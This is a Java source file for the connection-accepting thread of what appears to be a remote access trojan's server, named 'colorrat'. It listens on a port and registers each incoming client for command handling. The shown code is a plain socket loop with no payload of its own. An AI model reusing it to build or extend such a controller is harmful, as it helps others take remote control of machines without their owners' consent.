package eu.aragonapp.colorrat.network.thread.types;

import eu.aragonapp.colorrat.ColorServer;
import eu.aragonapp.colorrat.network.NetworkConnection;
import eu.aragonapp.colorrat.network.listener.Listener;
import eu.aragonapp.colorrat.network.thread.ColorThread;

import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.net.ServerSocket;
import java.net.Socket;
import java.net.SocketException;

/**
 * @Copyright (c) 2018 Mythic Inc. (http://www.mythic.com/) All Rights Reserved.
 * <p>
 * Mythic Inc. licenses this file to you under the Apache License,
 * @Version 2.0 (the "License"); you may not use this file except
 * in compliance with the License.
 * You may obtain a copy of the License at
 * @https://www.apache.org/licenses/LICENSE-2.0
 */
public class AcceptThread extends ColorThread {

    private ServerSocket serverSocket;
    private final Listener listener;

    public AcceptThread(Listener listener) {
        super("Accept");
        this.listener = listener;

        try {
            this.serverSocket = new ServerSocket(this.listener.getPort());
        } catch (Exception ex) {
            ex.printStackTrace();
        }
    }

    @Override
    public void run() {
        while (!this.isInterrupted()) {
            try {
                final Socket socket = this.serverSocket.accept();

                if (socket == null) return;
                socket.setKeepAlive(true);

                final NetworkConnection connection = new NetworkConnection(socket, this.listener, new ObjectOutputStream(socket.getOutputStream()), new ObjectInputStream(socket.getInputStream()));
                ColorServer.getInstance().getClients().add(connection);

                final ReceiveThread receiveThread = new ReceiveThread(connection);
                receiveThread.start();
            } catch (Exception ex) {
                if (ex instanceof SocketException && !ColorServer.getInstance().isRunning()) continue;

                ex.printStackTrace();
            }
        }
        this.close();
    }

}
